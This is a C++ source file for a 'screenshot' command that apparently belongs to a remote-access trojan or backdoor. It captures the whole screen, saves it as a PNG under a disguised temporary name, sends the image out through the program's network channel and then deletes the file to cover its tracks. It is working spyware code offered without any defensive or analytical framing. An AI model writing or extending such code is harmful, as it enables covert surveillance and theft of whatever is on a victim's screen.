#include "stdafx.h"
#include "Settings.h"
#include "Command_screenshot.h"
#include "Network.h"
#include "ImageUtils.h"
using namespace Gdiplus;

static int GetEncoderClsid(const wchar_t* format, CLSID* pClsid)
{
	UINT num = 0;	// number of image encoders
	UINT size = 0;	// size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if(size == 0)
		return -1;

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);

	for(UINT j = 0; j < num; ++j)
	{
		if(wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}

	free(pImageCodecInfo);
	return -1;
}

Command_screenshot::Command_screenshot()
{
}

Command_screenshot::~Command_screenshot()
{
}

bool Command_screenshot::OnExecute(const std::vector<std::tstring> &args)
{
	bool ret = true;

	TakeScreenshot(V_FAKE_TMP1);
	
	FILE *fp;
	errno_t error = _tfopen_s(&fp, V_FAKE_TMP1, _T("rb"));
	if(error != 0) {
		Error(_T("_tfopen failed"));
		ret = false;
		goto out_delete_file;
	}

	fseek(fp, 0, SEEK_END);
	size_t size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char* buffer = (char*)malloc(size);
	if(!buffer)
	{
		Error(_T("Couldn't allocate buffer"));
		ret = false;
		goto out_close_fp;
	}

	if(fread_s(buffer, size, 1, size, fp) != size)
	{
		Error(_T("fread_s did not return size"));
		ret = false;
		goto out_free_buffer;
	}

	network.SendFile(V_NET_FILE_DATA, size, buffer);

out_free_buffer: free(buffer);
out_close_fp:    fclose(fp);
out_delete_file: DeleteFile(V_FAKE_TMP1);
	return ret;
}

void Command_screenshot::TakeScreenshot(const std::tstring& filepath)
{
	int x1 = 0;
	int y1 = 0;
	int x2 = GetSystemMetrics(SM_CXSCREEN);
	int y2 = GetSystemMetrics(SM_CYSCREEN);
	int width = x2 - x1;
	int height = y2 - y1;

	HDC hDc = CreateCompatibleDC(NULL);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), x1, y1, SRCCOPY);

	Bitmap *bmp = Bitmap::FromHBITMAP(hBmp, NULL);

	CLSID pngClsid;
	int result = GetEncoderClsid(L"image/png", &pngClsid);

	std::wstring filepath_w = Util::t2ws(filepath);
	bmp->Save(filepath_w.c_str(), &pngClsid, NULL);

	delete bmp;
	DeleteObject(hBmp);
}